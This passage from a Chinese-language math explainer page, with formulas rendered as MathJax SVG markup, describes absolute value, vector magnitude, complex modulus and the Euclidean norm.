data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g></g></g></svg></mjx-container> 到原点的距离，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="14.165ex" height="2.751ex" role="img" focusable="false" viewBox="0 -966.5 6261.1 1216"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(743,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1298.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2354.6,0)"><g transform="translate(853,0)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1187.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2188,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(462,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,106.5)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="3053.6" height="60" x="853" y="846.5"></rect></g></g></g></svg></mjx-container>。绝对值符号在数学和物理学等领域中都有广泛的应用。</p><p>向量的模（或长度） <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="4.15ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1834.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(278,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(778.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1278.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1556.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 通常用于表示向量的大小或长度。对于二维向量 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="9.283ex" height="2.48ex" role="img" focusable="false" viewBox="0 -846 4103.2 1096"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1818.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2207.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2779.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3224.2,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3714.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，其模表示 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.097ex" height="1.939ex" role="img" focusable="false" viewBox="0 -846 485 857"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g></g></g></svg></mjx-container> 的长度，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.577ex;" xmlns="http://www.w3.org/2000/svg" width="16.082ex" height="2.851ex" role="img" focusable="false" viewBox="0 -1005 7108.1 1260"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(278,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(556,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1041,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1319,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1874.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2930.6,0)"><g transform="translate(1020,0)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1230.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2231,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,95)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="3157.6" height="60" x="1020" y="885"></rect></g></g></g></svg></mjx-container>。向量的模在几何学、线性代数、物理学等领域中都有广泛的应用。</p><p>与复数的模相比，绝对值符号和向量的模更加通用，可以用于表示不同类型的数值或向量的大小或距离。但是，它们之间也存在一些相似之处，例如它们都具有非负性、可以用于计算距离等。</p><h2 id="范数符号"><a href="#范数符号" class="headerlink" title="范数符号"></a>范数符号</h2><p>你可能指的是数学中的范数符号 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container>。范数是一种将向量映射到非负实数的函数，通常用于表示向量的大小或距离。范数符号 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 与复数的模 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 确实有些相似之处，但在数学上具有不同的定义和应用。</p><p>范数有很多种不同的定义，例如欧几里得范数、曼哈顿范数、切比雪夫范数等。其中，欧几里得范数是最常用的范数之一，它定义为：</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.453ex;" xmlns="http://www.w3.org/2000/svg" width="14.622ex" height="8.281ex" role="img" focusable="false" viewBox="0 -2133.6 6462.8 3660"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(278,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(763,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mn" transform="translate(1041,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(1818.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2874.6,0)"><g transform="translate(1056,0)"><g data-mml-node="munderover"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mi" transform="translate(509.9,1150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msubsup" transform="translate(1610.7,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 